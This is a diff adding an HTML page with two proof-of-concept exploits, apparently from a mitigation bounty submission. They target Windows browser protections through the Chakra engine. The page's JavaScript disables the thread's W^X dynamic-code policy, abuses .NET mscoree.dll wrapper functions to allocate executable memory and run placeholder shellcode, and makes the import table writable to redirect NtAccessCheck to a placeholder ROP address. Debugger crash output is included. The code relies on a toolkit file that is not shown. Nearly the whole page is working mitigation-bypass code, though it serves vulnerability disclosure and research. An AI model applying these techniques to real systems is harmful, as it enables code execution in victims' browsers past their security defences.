@@ -1,0 +1,250 @@
+<html>
+<head>
+<title>Mitigation bounty PoC by @mxatone (Thomas Garnier)</title>
+<link rel="stylesheet" type="text/css" href="theme.css">
+<!-- Generic toolkit that can be used on multiple PoCs -->
+<script type="text/javascript" src="toolkit.js"></script>
+<script type="text/javascript">
+// Disable W^X for the thread
+function disable_wx(exp) {
+	var THREAD_DYNAMIC_CODE_ALLOW = 1;
+	var ThreadDynamicCodePolicy = 2;
+	var cur_thread = -2;
+	var mem = exp.allocate(0x10);
+	exp.write_uint(mem, THREAD_DYNAMIC_CODE_ALLOW);
+	var r = exp.call_function("kernelbase.dll", "SetThreadInformation",
+		cur_thread, ThreadDynamicCodePolicy, mem, 4);
+	check_eq(r, 1);
+}
+
+// Get ICLRMetaHost base class to interact with .NET
+function get_meta_host(exp) {
+	// Load mscoree.dll
+	var dll = exp.dup_string("mscoree.dll");
+	var hModule = exp.call_function("kernel32.dll", "GetModuleHandleA", dll);
+	
+	if (!hModule.equal(0)) {
+		log("mscoree.dll was already loaded, if the poc fail kill the process and restart");
+	}
+	hModule = exp.call_function("kernel32.dll", "LoadLibraryA", dll);
+	check_ne(hModule, 0);
+	log("hModule = " + hModule.Stringify(16));
+	
+	// Take the address to CLRCreateInstance
+	var CLRCreateInstance = exp.GetProcAddressFromPEB("mscoree.dll", "CLRCreateInstance");
+	log("CLRCreateInstance = " + CLRCreateInstance.Stringify(16));
+	
+	// Call CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, ...)
+	var CLSID_CLRMetaHost = exp.dup_GUID(0x9280188d, 0xe8e, 0x4867, [0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde]);
+	var IID_ICLRMetaHost = exp.dup_GUID(0xD332DB9E, 0xB9B3, 0x4125, [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16]);
+	var ppInterface = exp.allocate(0x8);
+	var hresult = exp.call_function_ex(CLRCreateInstance, [CLSID_CLRMetaHost, IID_ICLRMetaHost, ppInterface]);
+	check_eq(hresult, 0);
+	
+	ICLRMetaHost = exp.read_ptr(ppInterface);
+	check_ne(ICLRMetaHost, 0);
+	log("ICLRMetaHost = " + ICLRMetaHost.Stringify(16));
+	return ICLRMetaHost;
+}
+
+// Poc1 - Use UtilExecutionEngine::ClrVirtualAlloc to allocate RWX memory
+function poc_1() {
+	var exp = null;
+	try {
+		exp = exploit_start("poc1 - Use UtilExecutionEngine::ClrVirtualAlloc to allocate RWX memory");
+		
+		// Disable W^X
+		disable_wx(exp);
+		
+		// Load mscoree.dll
+		var hModule = exp.call_function("kernel32.dll", "LoadLibraryA", exp.dup_string("mscoree.dll"));
+		check_ne(hModule, 0);
+		log("hModule = " + hModule.Stringify(16));
+		
+		/*
+		 * Find the thunk in mscoree.dll (UtilExecutionEngine::ClrVirtualAlloc)
+		 * Other wrappers that could be used to bypass CFG (see poc_2):
+		 *  - UtilExecutionEngine::ClrVirtualProtect
+		 *  - UtilExecutionEngine::ClrHeapCreate
+		 *  - UtilExecutionEngine::ClrGetProcessExecutableHeap (create an executable heap directly)
+		 *  - UtilExecutionEngine::ClrVirtualQuery (could be useful to scan memory)
+		 * Same functions exists on mscoreei.dll for each .NET versions.
+		 * Also variants in clr.dll (CExecutionEngine::Clr*)
+		 * Many places are implementing interfaces similar to IHostMemoryManager
+		 */
+		ICLRMetaHost = get_meta_host(exp);
+		ICLRMetaHost_vtable = exp.read_ptr(ICLRMetaHost);
+		var target_thunk = exp.read_ptr(ICLRMetaHost_vtable.add(0xd0));
+			
+		check_ne(target_thunk, 0);
+		log("target_thunk = " + target_thunk.Stringify(16));
+		
+		// Allocate READ_WRITE_EXECUTE
+		var MEM_COMMIT = 0x1000;
+		var alloc_size = 0x1000;
+		var PAGE_EXECUTE_READWRITE = 0x40;
+		var addr_null = 0;
+		var call_address = exp.call_function_ex(target_thunk, [0, addr_null, alloc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE]);
+		check_ne(call_address, 0);
+		log("allocated = " + call_address.Stringify(16));
+		
+		// Write shellcode
+		var shellcode = [0x90, 0x90, 0xcc];
+		exp.write(call_address, shellcode, shellcode.length);
+		
+		/*
+		 * Call our code:
+		 *
+		 * Will crash with this callstack
+		 * (2fc4.25f0): Break instruction exception - code 80000003 (first chance)
+		 * 000001fb`ef656002 cc              int     3
+		 *
+		 * 0:013> kb
+		 * Call Site
+		 * 0x000001fb`ef656002
+		 * RPCRT4!Invoke+0x73
+		 * RPCRT4!NdrStubCall2+0x38f
+		 * RPCRT4!NdrServerCall2+0x1a
+		 * chakra!amd64_CallFunction+0x93
+		 * chakra!Js::JavascriptFunction::CallFunction<1>+0x83
+		 *
+		 * 0:001> u 000001fb`ef656000
+		 * 000001fb`ef656000 90              nop
+		 * 000001fb`ef656001 90              nop
+		 * 000001fb`ef656002 cc              int3
+		 */
+		exp.call_function_ex(call_address, []);
+		
+		log("Failed ...");
+	} catch(err) {
+		log("JS EXCEPTION: "+err.stack);
+	} finally {
+		if (exp != null)
+			exp.cleanup();
+	}
+}
+
+// Return the address where the IAT store an imported function pointer
+function find_iat_ptr(exp, ptr_in_module, imported_module, function_name) {
+	// Find the base of the chakra.dll base on the vtable
+	var module_base = exp.find_module_base(ptr_in_module);
+	if (module_base == null) {
+		log("Could not found the base of target module (find_iat_ptr), bailing");
+		return null;
+	}
+	var chakra_pe_header = exp.find_module_pe_header(module_base);
+	
+	var import_ptr = module_base.add(exp.read_uint(chakra_pe_header.add(0x90)));
+	var import_size = exp.read_uint(chakra_pe_header.add(0x94));
+	
+	if (import_size.equal(0)) {
+		log("Empty import section? (find_iat_ptr)");
+		throw new Error(0, "Failed");
+	}
+	
+	// Look at the imported libraries for the one we are looking for
+	imported_module = imported_module.toUpperCase();
+	var prev_name = null;
+	var name = 0;
+	for (var e = 0; e < 100000; import_ptr = import_ptr.add(0x14)) {
+		var name = exp.read_uint(import_ptr.add(0xC));
+		if (name.equal(0)) {
+			log("Module not found");
+			return null;
+		}
+
+		// Already check that one
+		if (prev_name != null && prev_name.equal(name))
+			continue;
+		var name_ptr = module_base.add(name);
+		var cur_module = exp.read_ascii(name_ptr);
+		if (cur_module.toUpperCase() == imported_module) {
+			break;
+		}
+		log("MODULE: " + cur_module);
+		prev_name = name;
+	}
+	
+	// Search the module base on the import table of the one we know
+	function_name = function_name.toUpperCase();
+	var name_array = module_base.add(exp.read_uint(import_ptr.add(0)));
+	var thunk_table = module_base.add(exp.read_uint(import_ptr.add(0x10)));
+	for (var offset = 0; offset < 10000; offset++) {
+		var name_rva = exp.read_ptr(name_array.add(offset * 8));
+		if (name_rva.equal(0)) {
+			break;
+		}
+		var str = exp.read_ascii(module_base.add(name_rva.add(2)));
+		if (str.toUpperCase() != function_name)
+			continue;
+		return thunk_table.add(offset * 8);
+	}
+	throw new Error(0, "Function not found (find_iat_ptr)");
+}
+
+// Poc2 - Use UtilExecutionEngine::ClrVirtualProtect to overwrite IAT table
+function poc_2() {
+	var exp = null;
+	try {
+		exp = exploit_start("poc2 - Use UtilExecutionEngine::ClrVirtualProtect to overwrite IAT table");
+		
+		var AccessCheck = exp.GetProcAddressFromPEB("kernelbase.dll", "AccessCheck");
+		check_ne(AccessCheck, 0);
+		
+		var IAT_NtAccessCheck = find_iat_ptr(exp, AccessCheck, "ntdll.dll", "NtAccessCheck");
+		log("IAT reference to NtAccessCheck at " + IAT_NtAccessCheck.Stringify(16));
+		var aligned_ptr_to = IAT_NtAccessCheck.pagealign();
+		
+		// Load mscoree.dll
+		var hModule = exp.call_function("kernel32.dll", "LoadLibraryA", exp.dup_string("mscoree.dll"));
+		check_ne(hModule, 0);
+		log("hModule = " + hModule.Stringify(16));
+		
+		ICLRMetaHost = get_meta_host(exp);
+		ICLRMetaHost_vtable = exp.read_ptr(ICLRMetaHost);
+		var target_thunk = exp.read_ptr(ICLRMetaHost_vtable.add(0xe8));
+		check_ne(target_thunk, 0);
+		
+		// Re-protect IAT section to PAGE_READWRITE
+		var prot_size = 0x1000;
+		var PAGE_READWRITE = 0x4;
+		var prev_prot = exp.allocate(0x8);
+		var ret = exp.call_function_ex(target_thunk, [0, aligned_ptr_to, prot_size, PAGE_READWRITE, prev_prot]);
+		check_eq(ret, 1);
+		
+		// Set IAT NtAccessCheck to what we want
+		var rop_chain_addr = [0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA];
+		exp.write(IAT_NtAccessCheck, rop_chain_addr, rop_chain_addr.length);
+		
+		/*
+		 * Then call AccessCheck to start it, will crash as:
+		 *
+		 * (828.3270): Access violation - code c0000005 (first chance)
+		 * First chance exceptions are reported before any exception handling.
+		 * This exception may be expected and handled.
+		 * KERNELBASE!AccessCheck+0x33:
+		 * 00007ffd`92f90d93 ff1567761100    call    qword ptr [KERNELBASE!_imp_NtAccessCheck (00007ffd`930a8400)] ds:00007ffd`930a8400=aaaaaaaaaaaaaaaa
+		 */
+		exp.call_function_ex(AccessCheck, []);
+		
+		log("Failed ...");
+	} catch(err) {
+		log("JS EXCEPTION: "+err.stack);
+	} finally {
+		if (exp != null)
+			exp.cleanup();
+	}
+}
+</script>
+</head>
+<body>
+<h1>Mitigation bounty PoC - Use VirtualAlloc stub by @mxatone (Thomas Garnier)</h1>
+<div class="container">
+  <div class="buttonbar">
+    <input type="button" onclick="poc_1()" value="PoC 1 - Use UtilExecutionEngine::ClrVirtualAlloc to allocate RWX memory" />
+	<input type="button" onclick="poc_2()" value="PoC 2 - Use UtilExecutionEngine::ClrVirtualProtect to overwrite IAT table" />
+  </div>
+  <textarea id="log" class="text" wrap="off" placeholder="Log output will be here"></textarea>
+</div>
+</body>
+</html>
